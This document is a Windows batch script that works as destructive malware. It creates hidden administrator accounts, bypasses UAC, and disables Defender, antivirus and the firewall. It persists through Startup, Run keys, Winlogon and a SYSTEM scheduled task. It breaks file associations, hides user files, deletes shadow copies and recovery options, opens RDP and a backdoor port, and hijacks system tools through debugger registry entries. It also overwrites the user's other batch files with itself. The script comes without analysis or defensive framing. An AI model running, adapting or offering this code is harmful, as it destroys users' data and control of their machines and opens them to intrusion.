@echo off
setlocal enabledelayedexpansion

net user shadowAdmin DghYUhy489Gdg563F /add >nul 2>&1
net localgroup administrators shadowAdmin /add >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadowAdmin /t REG_DWORD /d 0 /f >nul 2>&1
echo Set UAC = CreateObject("Shell.Application") > "%TEMP%\bypass.vbs"
echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\bypass.vbs"
wscript.exe "%TEMP%\bypass.vbs" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%~f0" /t REG_SZ /d "RUNASADMIN" /f >nul 2>&1
if not '%1'=='admin' (
    powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
)

taskkill /f /im MsMpEng.exe
attrib +s +h +i +l +x +a "%0" >nul
wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy %0 "C:\Windows\Tasks\bat.bat" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "batbat" /t REG_SZ /d "%0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "bat_%random%" /t REG_SZ /d "%~f0" /f 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /d "bat.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /d "xDDD" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
wmic /namespace:\\root\securitycenter2 path antivirusproduct delete >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\Tasks\bat.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1
assoc .lnk=.xDDD
assoc .doc=.xDDD
assoc .xls=.xDDD
assoc .pdf=.xDDD
assoc .jpg=.xDDD
assoc .dll=.xDDD
assoc .mp3=.xDDD
assoc .bmp=.xDDD
assoc .txt=.xDDD
assoc .zip=.xDDD
assoc .rar=.xDDD
assoc .png=.xDDD
attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
bcdedit /set {default} recoveryenabled no
vssadmin delete shadows /all /quiet >nul
wmic shadowcopy delete >nul 2>&1
bcdedit /deletevalue {current} safeboot >nul 2>&1
netsh advfirewall set allprofiles state off
sc config WinDefend start= disabled >nul 2>&1
netsh advfirewall set allprofiles state off >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /v "OptionValue" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow protocol=TCP localport=1337 >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt" /v HideFileExt /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v "CheckedValue" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\perfmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\resmon.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mpcmdrun.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskschd.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EaseOfAccessDialog.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winver.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chkdsk.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diskpart.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msiexec.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableBootMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDispScrSavPage" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableMSConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableConfig" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableSR" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableContextMenusInStart" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "HidePowerOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DenyUsersFromMachGP" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorcstation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetTaskbar" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoWinKeys" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoChangingWallPaper" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "StartMenuLogOff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCommonGroups" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoClose" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFileMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFolderOptions" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoFind" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoDrives" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoViewOnDrive" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoRun" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSetFolders" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoSaveSettings" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "NoCloseDragDropBands" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableFirstLogonAnimation" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
for /l %%i in (1,1,10) do (
    set u=!random!
    set p=!random!
    net user !u! !p! /add >nul 2>&1
    net localgroup administrators !u! /add >nul 2>&1
)
